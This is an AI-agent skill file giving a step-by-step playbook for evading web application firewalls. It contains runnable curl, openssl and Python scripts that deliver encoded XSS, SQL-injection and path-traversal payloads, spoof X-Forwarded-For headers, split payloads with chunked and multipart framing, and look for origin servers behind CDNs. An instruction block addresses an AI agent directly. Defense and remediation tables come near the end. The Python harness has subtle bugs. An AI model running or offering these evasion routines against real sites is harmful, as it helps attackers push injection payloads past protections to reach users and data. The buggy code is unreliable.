---
name: waf-bypass-techniques
description: >-
  WAF bypass methodology and generic evasion techniques. Use when a web application
  firewall blocks injection payloads (SQLi, XSS, RCE) and you need to craft
  bypasses using encoding, protocol-level tricks, or WAF-specific weaknesses.
---

# SKILL: WAF Bypass Techniques — Evasion Playbook

> **AI LOAD INSTRUCTION**: Covers WAF identification, generic bypass categories (encoding, protocol abuse, HTTP/2, parameter pollution), and a decision tree. For product-specific bypasses (Cloudflare, AWS WAF, ModSecurity, Akamai, etc.), load [WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md). Base models often suggest basic encoding but miss protocol-level bypasses and WAF behavioral quirks.

## 0. RELATED ROUTING

- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) for payloads to deliver after bypassing WAF
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) for XSS payloads that need WAF evasion
- [request-smuggling](../request-smuggling/SKILL.md) when smuggling can route requests around WAF entirely
- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) HPP is itself a WAF bypass primitive
- [csp-bypass-advanced](../csp-bypass-advanced/SKILL.md) when WAF blocks inline scripts but CSP bypass is available
- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) **Java backends only** — when every encoding trick above is blocked, use Ghost Bits: Java's 16-bit `char` to 8-bit `byte` narrowing produces 255 Unicode bypass variants per dangerous ASCII byte; re-enables WAF-patched CVEs in Tomcat, Spring, Jetty, Jackson, Fastjson, BCEL, and more

### Product-Specific Reference

Load [WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md) when you need per-product bypass techniques for Cloudflare, AWS WAF, ModSecurity CRS, Akamai, Imperva, F5 BIG-IP, or Sucuri.

---

## 1. PHASE 0 — IDENTIFY THE WAF

Before bypassing, know what you're fighting.

### 1.1 Tools

| Tool | Usage |
|---|---|
| `wafw00f target.com` | Fingerprint WAF vendor from response headers/behavior |
| `nmap --script=http-waf-detect` | NSE script for WAF detection |
| Manual header inspection | `Server`, `X-CDN`, `X-Cache`, `cf-ray` (Cloudflare), `x-sucuri-id`, `x-akamai-*` |

### 1.2 Behavioral Fingerprinting

```
1. Send benign request → record baseline response (status, headers, body size)
2. Send obvious attack: /?q=<script>alert(1)</script>
3. Compare: 403? Custom block page? Redirect? Connection reset?
4. Block page content reveals WAF: "Cloudflare", "Access Denied (Imperva)", "ModSecurity"
5. If transparent proxy: check response time difference (WAF adds latency)
```

---

## 2. GENERIC BYPASS CATEGORIES

### 2.1 Encoding Bypasses

| Technique | Example | Bypasses |
|---|---|---|
| URL encoding | `%3Cscript%3E` | Basic string matching |
| Double URL encoding | `%253Cscript%253E` | WAFs that decode once, app decodes twice |
| Unicode encoding | `%u003Cscript%u003E` | IIS-specific Unicode normalization |
| HTML entities | `&#60;script&#62;` or `&#x3c;script&#x3e;` | WAFs not performing HTML entity decoding |
| Hex encoding (SQL) | `0x756E696F6E` = `union` | WAFs matching SQL keywords |
| Octal encoding | `\74script\76` | Rare but some parsers handle it |
| Overlong UTF-8 | `%C0%BC` (invalid encoding for `<`) | Legacy parsers with loose UTF-8 handling |
| Mixed case | `SeLeCt`, `uNiOn` | Case-sensitive rule matching |
| Null byte | `sel%00ect` | WAFs that stop parsing at null |

### 2.2 Chunked Transfer Encoding

Split the payload across HTTP chunks so no single chunk contains the blocked pattern:

```http
POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0

```

WAFs that inspect the full body may not reassemble chunks before matching.

### 2.3 HTTP/2 Binary Format Bypasses

HTTP/2 transmits headers as binary HPACK-encoded frames. Some WAFs only inspect after downgrading to HTTP/1.1:

- Header names can contain characters illegal in HTTP/1.1
- Pseudo-headers (`:method`, `:path`) bypass header-based WAF rules
- H2 → H1 downgrade may introduce request smuggling (see [request-smuggling](../request-smuggling/SKILL.md))

### 2.4 HTTP Parameter Pollution (HPP)

Different servers handle duplicate parameters differently:

| Server | Behavior for `?a=1&a=2` |
|---|---|
| PHP/Apache | Last value: `a=2` |
| ASP.NET/IIS | Concatenated: `a=1,2` |
| Python/Flask | First value: `a=1` |
| Node.js/Express | Array: `a=[1,2]` |

WAF checks `a=1` (benign), app uses `a=2` (malicious). Or combine: `a=sel&a=ect` → ASP.NET sees `a=sel,ect`.

### 2.5 IP Source Spoofing (Bypass IP-Based Rules)

Headers trusted by some WAFs/apps for client IP:

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Use case: WAF whitelists internal IPs or has different rule sets per source.

### 2.6 Path Normalization Tricks

| Technique | Example | Effect |
|---|---|---|
| Dot segments | `/./admin` or `/../target/admin` | WAF sees different path than app |
| Double slash | `//admin` | Some normalizers collapse, WAFs may not |
| URL encoding path | `/%61dmin` | WAF sees encoded, app decodes |
| Null byte in path | `/admin%00.jpg` | Legacy: app truncates at null, WAF sees .jpg |
| Backslash (IIS) | `/admin\..\/secret` | IIS treats `\` as `/` |
| Trailing dot/space | `/admin.` or `/admin%20` | OS-level normalization (Windows) |
| Semicolon (Tomcat) | `/admin;jsessionid=x` | Tomcat strips after `;`, WAF may not |

### 2.7 Content-Type Manipulation

WAFs often have format-specific parsers. Switching Content-Type can bypass rules:

```
Default:  Content-Type: application/x-www-form-urlencoded  → WAF parses params
Switch:   Content-Type: application/json  → WAF may not parse JSON body
Switch:   Content-Type: multipart/form-data  → WAF may not inspect all parts
Switch:   Content-Type: text/xml  → WAF expects XML, payload in different format
```

**Trick**: If app accepts both JSON and form-urlencoded, use JSON — WAFs often have weaker JSON inspection rules.

### 2.8 Multipart Boundary Abuse

```http
Content-Type: multipart/form-data; boundary=----WAFBypass

------WAFBypass
Content-Disposition: form-data; name="q"

<script>alert(1)</script>
------WAFBypass--
```

Variations: long boundary strings, boundary with special characters, missing final boundary, nested multipart.

### 2.9 Newline & Whitespace Injection

```sql
-- SQL keyword splitting
SEL
ECT * FROM users

-- SQL comment insertion
SEL/**/ECT * FR/**/OM users
UN/**/ION SEL/**/ECT 1,2,3

-- Tab/vertical tab as separator
SELECT\t*\tFROM\tusers
```

### 2.10 Keyword Splitting & Alternative Syntax

| Blocked | Alternative |
|---|---|
| `UNION SELECT` | `UNION ALL SELECT`, `UNION DISTINCT SELECT` |
| `OR 1=1` | `OR 2>1`, `OR 'a'='a'`, `||1` |
| `<script>` | `<svg/onload=alert(1)>`, `<img src=x onerror=alert(1)>` |
| `alert(1)` | `prompt(1)`, `confirm(1)`, `print()` (Chrome) |
| `eval()` | `Function('code')()`, `setTimeout('code',0)` |
| `' OR '1'='1` | `' OR 1-- -`, `'\|\|'1` |
| `SLEEP(5)` | `BENCHMARK(5000000,SHA1('x'))`, `pg_sleep(5)` |

---

## 3. PROTOCOL-LEVEL BYPASS TECHNIQUES

### 3.1 Request Line Abuse

```http
GET /path?q=attack HTTP/1.1    ← WAF inspects
```

vs.

```http
GET http://target.com/path?q=attack HTTP/1.1   ← Absolute URI: some WAFs miss the path
```

### 3.2 Header Injection via CRLF

If WAF inspects original headers but app processes injected ones:

```
X-Custom: value\r\nX-Forwarded-For: 127.0.0.1
```

### 3.3 Connection-State Bypass

```
1. Establish connection through WAF (normal request)
2. On same keep-alive connection, send attack request
3. Some WAFs reduce inspection on subsequent requests in same connection
```

---

## 4. WAF BYPASS DECISION TREE

```
Payload blocked by WAF?
├── Identify WAF (wafw00f, response headers, block page)
│
├── Try encoding bypasses
│   ├── URL encode payload → still blocked?
│   ├── Double URL encode → still blocked?
│   ├── Unicode/overlong UTF-8 → still blocked?
│   ├── Mixed case keywords → still blocked?
│   └── HTML entities (for XSS) → still blocked?
│
├── Try protocol-level bypasses
│   ├── Switch Content-Type (JSON, multipart, XML)
│   │   └── App accepts alternate format? → re-send payload
│   ├── HTTP Parameter Pollution (duplicate params)
│   ├── Chunked Transfer-Encoding to split payload
│   ├── HTTP/2 direct if available (binary framing bypass)
│   └── Request line: absolute URI format
│
├── Try path-based bypasses
│   ├── Path normalization (/./path, //path, ;param)
│   ├── Different HTTP method (POST vs PUT vs PATCH)
│   └── Alternate endpoint serving same function
│
├── Try payload mutation
│   ├── SQL: comments (/**/), alternative functions, hex literals
│   ├── XSS: alternative tags/events, JS template literals
│   ├── RCE: wildcard abuse, string concatenation, variable expansion
│   └── Check WAF_PRODUCT_MATRIX.md for vendor-specific mutations
│
├── Try IP-source bypass
│   ├── X-Forwarded-For / True-Client-IP spoofing
│   ├── Access origin server directly (bypass CDN)
│   └── Find origin IP (Shodan, historical DNS, email headers)
│
└── Try request smuggling to skip WAF entirely
    └── See ../request-smuggling/SKILL.md
```

---

## 5. COMMON MISTAKES & TRICK NOTES

1. **Test bypass with actual exploitation, not just 200 OK**: WAF may return 200 but strip the payload silently.
2. **WAFs often have size limits**: Very large request bodies (>8KB–128KB depending on WAF) may bypass inspection entirely.
3. **Rate limiting ≠ WAF**: Getting 429s is rate limiting, not payload blocking. Different bypass needed.
4. **CDN caching**: If the WAF is at CDN level, cached responses bypass WAF on subsequent requests. Poison cache with clean request, exploit cache.
5. **Origin server direct access**: If you find the origin IP behind CDN/WAF, connect directly — WAF is bypassed completely.
6. **Multipart file upload fields**: WAFs often skip inspection of file content in multipart uploads — embed payload in filename or file content if reflected.

---

## 6. DEFENSE PERSPECTIVE

| Measure | Notes |
|---|---|
| WAF + application-level input validation | WAF is a layer, not a fix |
| Parameterized queries | Eliminates SQLi regardless of WAF |
| CSP + output encoding | Eliminates XSS regardless of WAF |
| Regularly update WAF rules | Vendor signatures lag behind new bypasses |
| Deny by default, not block-list | Allowlist valid input patterns |
| Log and alert on WAF blocks | Bypass attempts are visible in logs |

---

## 7. EXECUTION PRIMITIVES

A WAF bypass is proven by **the payload reaching the origin and having its effect, while the same
payload sent unmodified is blocked**. The blocked control is mandatory.

### 7.1 Capture the blocked control for each payload class

```bash
T="https://target.tld"
blocked() { curl -sS -o /tmp/wb -D /tmp/wh -w '%{http_code} %{size_download}' "$@"; }
echo "--- XSS payload, unmodified"
blocked "$T/search?q=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote("<script>alert(1)</script>"))')"; echo
echo "--- SQLi payload, unmodified"
blocked "$T/item?id=1%20UNION%20SELECT%201,2,3--"; echo
echo "--- path traversal, unmodified"
blocked "$T/file?p=../../../../etc/passwd"; echo
grep -iE 'cloudflare|akamai|incapsula|imperva|sucuri|f5|big-ip|barracuda|fortiweb|aws|awselb|mod_security' /tmp/wh
```

**Record the block page fingerprint** - the status, the body marker, and the headers. Every bypass test
compares against it, and the WAF vendor headers tell you which bypass family applies.

### 7.2 Encoding and obfuscation matrix

```bash
P='<script>alert(1)</script>'
enc() { python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
for V in \
  "$P" \
  "$(python3 -c "import urllib.parse;print(urllib.parse.quote('<script>alert(1)</script>'))")" \
  "$(python3 -c "import urllib.parse;print(urllib.parse.quote(urllib.parse.quote('<script>alert(1)</script>')))")" \
  '%3cscript%3ealert(1)%3c/script%3e' \
  '%253cscript%253ealert(1)%253c/script%253e' \
  '<scr%00ipt>alert(1)</scr%00ipt>' \
  '<script>ale\u0072t(1)</script>' \
  '<SCRIPT>alert(1)</SCRIPT>' \
  '<script >alert(1)</script >' \
  '<script/x>alert(1)</script>' \
  '<svg/onload=alert(1)>' \
  '<img src=x onerror=alert(1)>' \
  '<details open ontoggle=alert(1)>' ; do
  R=$(curl -sS -o /tmp/w -w '%{http_code} %{size_download}' "$T/search?q=$V")
  printf '%-50s %s\n' "${V:0:46}" "$R"
done
```

The variants that matter are **double URL encoding, percent-encoded nulls, Unicode escapes, and
re-ordered/whitespace-modified tags**. Compare each response against the block fingerprint - an
identical `403` plus block page means the WAF still caught it, regardless of encoding.

### 7.3 Unicode and encoding normalisation attacks

```bash
# the WAF normalises one way, the origin another; the classic families are fullwidth and homoglyph
for V in \
  '%ef%bc%9cscript%ef%bc%9ealert(1)%ef%bc%9c/script%ef%bc%9e' \
  '%c0%bcscript%c0%bealert(1)%c0%bc/script%c0%be' \
  '%e0%80%bcscript%e0%80%bealert(1)' \
  '%u003cscript%u003ealert(1)%u003c/script%u003e' \
  '%uff1cscript%uff1ealert(1)' \
  '<scr\x00ipt>alert(1)</scr\x00ipt>' \
  '<script%09>alert(1)</script>' \
  '<script%0a>alert(1)</script>' ; do
  R=$(curl -sS -o /tmp/u -w '%{http_code} %{size_download}' "$T/search?q=$V")
  printf '%-48s %s\n' "${V:0:44}" "$R"
done
```

Overlong UTF-8, UTF-16/`%u` escapes, and fullwidth ASCII are decoded differently by different stacks.
**A `200` where the block page used to be, plus the payload rendered in a browser-executable context,
is the bypass.**

### 7.4 Protocol-level and framing positions

```bash
# a parameter split across the URL and the body, before and after the WAF's inspection point
curl -sS -o /tmp/p1 -w 'query-only   %{http_code} %{size_download}\n' "$T/search?q=%3Cscript%3Ealert(1)%3C/script%3E"
curl -sS -o /tmp/p2 -w 'body-only    %{http_code} %{size_download}\n' -X POST "$T/search" \
  --data-urlencode 'q=<script>alert(1)</script>'
curl -sS -o /tmp/p3 -w 'both         %{http_code} %{size_download}\n' -X POST "$T/search?q=1" \
  --data-urlencode 'q=<script>alert(1)</script>'
# and a chunked body so the WAF cannot see the payload contiguously
printf 'POST /search HTTP/1.1\r\nHost: target.tld\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nq=%3C\r\n1e\r\nscript%3Ealert(1)\r\n0\r\n\r\n' | \
  openssl s_client -quiet -connect target.tld:443 -servername target.tld 2>/dev/null | head -12
```

Position and framing determine whether the WAF sees the payload contiguously. **Chunked bodies and
parameter-position shifts are the highest-yield techniques** when the WAF inspects a normalised view
that the origin does not use.

### 7.5 Content-type and multipart confusion

```bash
# the WAF parses one content-type, the origin another
for CT in 'application/x-www-form-urlencoded' 'multipart/form-data' 'application/json' \
          'text/plain' 'application/xml' 'application/json; charset=utf-7'; do
  R=$(curl -sS -o /tmp/ct -w '%{http_code} %{size_download}' -X POST "$T/search" \
        -H "Content-Type: $CT" --data-urlencode 'q=<script>alert(1)</script>')
  printf '%-40s %s\n' "$CT" "$R"
done
# and a multipart body where the boundary is unusual, so parsing differs
curl -sS -o /tmp/mp -w 'odd-boundary %{http_code} %{size_download}\n' -X POST "$T/search" \
  -H 'Content-Type: multipart/form-data; boundary=--boundary' \
  --data-binary $'----boundary\r\nContent-Disposition: form-data; name="q"\r\n\r\n<script>alert(1)</script>\r\n----boundary--'
```

A **parser mismatch between the WAF and the origin** is the root of this family - including
`charset=utf-7` and unusual boundary forms. Confirm the origin parsed the body by checking the effect,
not the response size alone.

### 7.6 Header-based WAF evasion

```bash
# hop-by-hop and forwarding headers that can change what the WAF inspects
for H in \
  'X-Forwarded-For: 127.0.0.1' 'X-Real-IP: 127.0.0.1' 'X-Originating-IP: 127.0.0.1' \
  'X-Forwarded-Host: localhost' 'X-Original-URL: /search' 'X-Rewrite-URL: /search' \
  'Content-Type: application/x-www-form-urlencoded' 'Transfer-Encoding: identity' \
  'Connection: close' 'Expect:' ; do
  R=$(curl -sS -o /tmp/hb -w '%{http_code} %{size_download}' "$T/search?q=%3Cscript%3Ealert(1)%3C/script%3E" -H "$H")
  printf '%-46s %s\n' "$H" "$R"
done
```

Some WAFs skip inspection for internal-looking source addresses, or for requests with particular
framing headers. **A change from the block fingerprint back to a `200` is the bypass** - then verify the
payload actually rendered or executed.

### 7.7 Confirm the origin received the payload

```bash
# the strongest proof: the payload's effect, not just a 200
curl -sS -o /tmp/eff -w '%{http_code}\n' "$T/search?q=<svg/onload=alert(1)>"
grep -c '<svg/onload=alert(1)>' /tmp/eff
echo "and check whether it is in an executable context (not escaped, inside HTML, not an attribute)"
python3 - <<'PY'
import re
b=open('/tmp/eff','rb').read().decode('utf-8','replace')
for m in re.finditer(r'.{60}<svg/onload.{60}', b):
    print(repr(m.group(0)))
PY
```

Escaped output (`&lt;svg`) is **not** a bypass - the WAF let it through and the application escaped it.
**The bypass requires the payload to reach an executable sink**, so check the context every time.

### 7.8 A bypass harness that measures the whole matrix at once

```bash
python3 - <<'PY'
import urllib.request, urllib.parse, itertools
T="https://target.tld/search"
payload="<script>alert(1)</script>"
enc  =[("plain",payload),
       ("url",urllib.parse.quote(payload)),
       ("double",urllib.parse.quote(urllib.parse.quote(payload))),
       ("upper",payload.upper()),
       ("nullinject",payload.replace("script","scr%00ipt")),
       ("tabws",payload.replace(">","	>"))]
hdrs=[[], [("X-Forwarded-For","127.0.0.1")], [("Content-Type","text/plain")]]
for (en,pv),hs in itertools.product(enc,hdrs):
    url=f"{T}?q={pv}"
    req=urllib.request.Request(url,headers=dict(hs))
    try:
        r=urllib.request.urlopen(req,timeout=10)
        code,body,lenb=r.status,r.read(),len(r.read())
    except urllib.error.HTTPError as e:
        code,body=r_code=e.code,e.read()
    marker = b"blocked" in body or b"Cloudflare" in body
    print(f"{en:10} {str(hs):30} code={code} blocked={marker} reflected={payload.encode() in body}")
PY
```

Run the matrix and **report the single cell that both bypassed the block and reached the sink** - not
the whole table. A bypass that only changes the status code, with no effect, is not a finding.

---

## 8. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Is the **unmodified payload actually blocked** (status, block page fingerprint)? | the thing being bypassed |
| 2 | Does the encoded variant return **`200` with the payload reaching the sink**? | the bypass |
| 3 | Does the payload **take effect** (executes, errors the SQL, returns the file)? | impact, not just passage |
| 4 | Is the **WAF vendor and rule set** identified, with the header or page marker? | the finding is against a named control |
| 5 | Which **transformation** caused it (encoding, framing, position, header)? | the fix target |
| 6 | Does it reproduce on a **second payload class** (SQLi, traversal) or only one? | scope of the bypass |
| 7 | Is the origin **unprotected** apart from the WAF - would the payload work without it? | proves the WAF is the only control |

**The blocked control and the effect together are the finding.** A payload that returns `200` but is
escaped, inert, or ignored has not bypassed anything that mattered.

---

## 9. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **blocked request** - payload, status, and the block-page fingerprint | establishes the control |
| The **bypass request** - the exact encoding or framing, byte for byte | reproducibility |
| The **effect** - the executed script, the SQL error, or the file contents | proves the payload reached the sink |
| The **WAF identification** - vendor, the header or page marker, and the rule that fired | the finding is about a named control |
| The **transformation** that worked, isolated from the others | the fix must cover exactly this |
| **Negative control** - a trivially invalid request still returns a normal response | shows the WAF did not simply fall over |
| The **origin behaviour without the WAF**, where in scope (a staging copy) | proves the WAF was the only control |
| The **payload class coverage** - which classes bypass, which do not | the finding's scope |
| The **tool and version** used, since encoding behaviour is tool-sensitive | reproducibility |
| A statement that no **denial of service** was caused to the WAF | scope discipline |

Report the **blocked control, the bypass, and the effect**: "`GET /search?q=<script>alert(1)</script>`
returns `403` with the vendor's block page; `GET /search?q=%253Cscript%253Ealert(1)%253C/script%253E`
returns `200` and the origin decodes the double-encoded value, placing the payload unescaped in the
results page where a browser executes it; the block page and `CF-Ray` header identify the edge WAF, and
the same double-encoding bypasses the SQL injection and path traversal payloads as well", never
"the WAF can be bypassed".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A `200` with the payload reflected but escaped | the application handled it correctly |
| A variant that returns `200` with an empty or truncated body | the request failed differently, no effect |
| A payload that the origin ignored entirely | no sink |
| A bypass achieved by disabling the WAF for the test | invalid test |
| A different status with no effect on the response content | a status artefact |
| An encoding the origin rejects with `400` | nothing reached the sink |
| A blocked request that was never blocked in the first place | nothing to bypass |
| A payload that works because the endpoint has no validation at all | not a WAF bypass; report the missing validation |
| A bypass that only works on a staging host without the WAF | not in scope |
| A timing difference caused by the WAF's own latency | measure with controls |
| A "bypass" that is really a different rule matching | identify the transformed payload, not the class |
| A payload that executes only in a browser you configured | not reproducible for a victim |

**Effect or it did not happen.** A WAF bypass without a demonstrated sink effect is a status code
observation.

---

## 10. REMEDIATION REFERENCE

1. **Fix the vulnerability rather than the filter** - a WAF is a compensating control; the code-level fix removes the class, and every bypass above becomes irrelevant.
2. **Keep the WAF's rule set and the managed rules updated** - most of the encoding and framing bypasses are known and patched; the version is often the whole remediation.
3. **Normalise the request before inspection, and pass the normalised form upstream** - the recurring root cause is that the WAF and the origin parse differently, so make one parser authoritative.
4. **Reject requests with invalid or ambiguous framing outright** - conflicting `Content-Length`/`Transfer-Encoding`, malformed chunked bodies, and unusual `charset` values should be errors at the edge.
5. **Enable request-body inspection for every content type you actually accept** - a WAF configured for form data and applied to JSON APIs is inspection theatre.
6. **Validate input at the application, per parameter** - typed schemas and allowlists catch what encoding tricks cannot evade, and they are independent of the WAF.
7. **Encode output at the sink** - HTML escaping, parameterised queries, and path canonicalisation mean a WAF bypass has no consequence even when it succeeds.
8. **Do not exempt internal-looking source addresses from inspection** - `X-Forwarded-For` is attacker-controlled and must not influence whether a request is inspected; the edge must strip it.
9. **Log the normalised request and the original side by side** - this is how you detect a parser mismatch, and it is the evidence you need when a bypass is reported.
10. **Run the bypass payload set against the WAF in CI** - a regression suite that asserts each known payload class is blocked detects a rule-set change or an origin upgrade that broke normalisation.
11. **Treat a WAF bypass as a finding about the origin** - the report should name the vulnerability the WAF was hiding, because that is what must be fixed.

---

## 11. RELATED SIBLINGS - LOAD TOGETHER

- [http-parameter-pollution](../http-parameter-pollution/SKILL.md) - the parser-disagreement bypass family
- [request-smuggling](../request-smuggling/SKILL.md) - the framing bypass that changes what the WAF sees
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - the sink an XSS bypass must reach
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) - the sink an SQLi bypass must reach
- [cloudflare-waf-recon-survival](../cloudflare-waf-recon-survival/SKILL.md) - the vendor-specific recon and survival playbook
